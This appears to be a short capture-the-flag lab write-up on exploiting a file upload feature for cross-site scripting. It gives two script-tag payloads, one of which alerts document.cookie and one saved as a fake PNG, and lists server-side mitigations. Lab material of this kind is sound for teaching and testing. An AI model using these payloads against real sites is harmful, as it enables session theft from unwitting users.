# 04 - File Upload + XSS

## Objective
Upload malicious files to achieve XSS or remote code execution.

## Vulnerability Location
File upload functionality

## Exploitation

### Malicious Image Upload

Upload a file with embedded XSS payload:

```html
<script>alert(document.cookie)</script>
```

### Payload for PNG

Create a file named `xss.png` with content:
```png
<script>alert('XSS')</script>
```

## Mitigation

- Validate file type server-side
- Rename uploaded files
- Store outside web root
- Disable script execution in upload directory

## Flag

Successfully execute XSS or find the flag in uploaded files.
